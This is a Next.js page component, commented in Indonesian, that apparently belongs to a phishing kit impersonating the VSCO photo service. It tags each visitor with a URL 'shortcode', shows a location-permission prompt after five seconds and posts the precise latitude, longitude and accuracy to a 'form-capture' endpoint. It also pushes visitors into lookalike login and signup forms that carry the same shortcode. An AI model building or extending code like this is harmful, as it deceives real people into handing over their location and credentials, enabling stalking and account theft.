'use client';

import CommunitySection from '@/app/[lang]/vsco/components/community-section';
import PlansSection from '@/app/[lang]/vsco/components/plan-section2';
import { useRouter, useSearchParams } from 'next/navigation';
import { useEffect, useState } from 'react';
import HeaderNav from './components/header-nav';
import Hero from './components/hero';
import LoadingScreen from './components/loading-screen';
import LocationPermissionModal from './components/location-permission-modal';
import PhotoToolsSection from './components/photo-tools-section';
import LoginModal from './components/login-modal';
import SignupModal from './components/signup-modal';
import './styles.css';

export default function VSCOPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const shortcode = searchParams.get('shortcode');

  // State untuk modal
  const [showLocationModal, setShowLocationModal] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [showSignupModal, setShowSignupModal] = useState(false);

  // State untuk tracking
  const [isLoading, setIsLoading] = useState(true);
  const [hasTracked, setHasTracked] = useState(false);

  // Tambahkan fungsi handler untuk switch antara login dan signup
  const [activeModal, setActiveModal] = useState<'login' | 'signup' | null>(
    null,
  );

  const handleSwitchToSignup = () => {
    setShowLoginModal(false);
    setShowSignupModal(true);
  };

  const handleSwitchToLogin = () => {
    setShowSignupModal(false);
    setShowLoginModal(true);
  };

  // Melakukan tracking saat halaman dimuat
  useEffect(() => {
    const trackVisit = async () => {
      try {
        // Track kunjungan ke halaman vsco
        await fetch('/api/track', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            pageType: 'vsco',
            pageId: window.innerWidth + 'x' + window.innerHeight,
          }),
        });

        setHasTracked(true);
      } catch (error) {
        console.error('Error tracking page view:', error);
      } finally {
        setIsLoading(false);
      }
    };

    trackVisit();

    // Tampilkan modal lokasi setelah 5 detik
    const timer = setTimeout(() => {
      setShowLocationModal(true);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  // Handler untuk location permission modal
  const handleLocationPermissionGranted = async (
    latitude: number,
    longitude: number,
    accuracy: number,
  ) => {
    try {
      // Kirim data geolokasi ke form-capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'vsco',
          shortcode,
          additional_data: {
            geolocation: {
              latitude,
              longitude,
              accuracy,
              timestamp: new Date().toISOString(),
            },
          },
        }),
      });

      // Kirim data tracking dengan geolokasi
      await fetch('/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pageType: 'vsco',
          pageId: 'geolocation',
          geoData: {
            latitude,
            longitude,
            accuracy,
            timestamp: Date.now(),
          },
        }),
      });
    } catch (error) {
      console.error('Error sending geolocation data:', error);
    } finally {
      setShowLocationModal(false);
    }
  };

  // Handler untuk gallery login requirement
  const handleLoginRequired = () => {
    // 50% chance untuk login atau signup
    if (Math.random() > 0.5) {
      router.push('/vsco/user/login');
    } else {
      router.push('/vsco/user/signup');
    }
  };

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <div className='w-full'>
      <HeaderNav />

      <Hero />

      <PlansSection />

      <PhotoToolsSection />

      <CommunitySection />

      {/* Location Modal */}
      <LocationPermissionModal
        isOpen={showLocationModal}
        onClose={() => setShowLocationModal(false)}
        onPermissionGranted={handleLocationPermissionGranted}
      />

      <LoginModal
        isOpen={showLoginModal}
        onClose={() => setShowLoginModal(false)}
        onSwitchToSignup={handleSwitchToSignup}
        shortcode={shortcode || undefined}
      />

      <SignupModal
        isOpen={showSignupModal}
        onClose={() => setShowSignupModal(false)}
        onSwitchToLogin={handleSwitchToLogin}
        shortcode={shortcode || undefined}
      />
    </div>
  );
}
